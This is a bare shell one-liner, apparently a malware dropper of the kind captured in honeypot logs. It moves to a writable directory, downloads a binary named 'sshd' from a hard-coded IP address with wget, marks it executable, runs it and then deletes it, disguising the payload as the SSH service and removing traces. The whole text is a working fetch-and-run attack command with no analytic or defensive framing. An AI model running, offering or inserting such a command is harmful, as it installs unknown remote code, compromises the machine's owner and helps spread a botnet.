cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.178.96.119/sshd; chmod +x sshd; ./sshd; rm -rf sshd
